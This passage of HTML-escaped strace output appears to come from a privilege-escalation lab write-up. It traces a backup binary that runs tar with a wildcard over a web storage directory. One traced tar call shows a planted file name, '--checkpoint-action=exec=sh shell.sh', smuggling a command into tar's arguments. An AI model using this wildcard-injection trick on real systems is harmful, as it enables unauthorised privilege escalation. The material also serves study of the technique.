class="nt"&gt;grep&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;
&lt;span class="nt"&gt;strace&lt;/span&gt; &lt;span class="nt"&gt;-s&lt;/span&gt; &lt;span class="nt"&gt;999&lt;/span&gt; &lt;span class="nt"&gt;-v&lt;/span&gt; &lt;span class="nt"&gt;-f&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="nt"&gt;backup&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;grep&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;
&lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./backup&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./backup&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/tmp&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;pid&lt;/span&gt;  &lt;span class="mi"&gt;1779&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;%Y%m%d&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;).tar.gz *;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/strace&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/tmp&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;pid&lt;/span&gt;  &lt;span class="mi"&gt;1781&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;+%Y%m%d&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/date&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;pid&lt;/span&gt;  &lt;span class="mi"&gt;1782&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;-zvcf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;database.sqlite&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;framework&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;logs&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shell.sh&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;pid&lt;/span&gt;  &lt;span class="mi"&gt;1783&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/local/bin/gzip&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gzip&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh %s&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nt"&gt;-1&lt;/span&gt; &lt;span class="nt"&gt;ENOENT&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;No&lt;/span&gt; &lt;span class="nt"&gt;such&lt;/span&gt; &lt;span class="nt"&gt;file&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;directory&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;pid&lt;/span&gt;  &lt;span class="mi"&gt;1783&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;execve&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/gzip&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gzip&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span 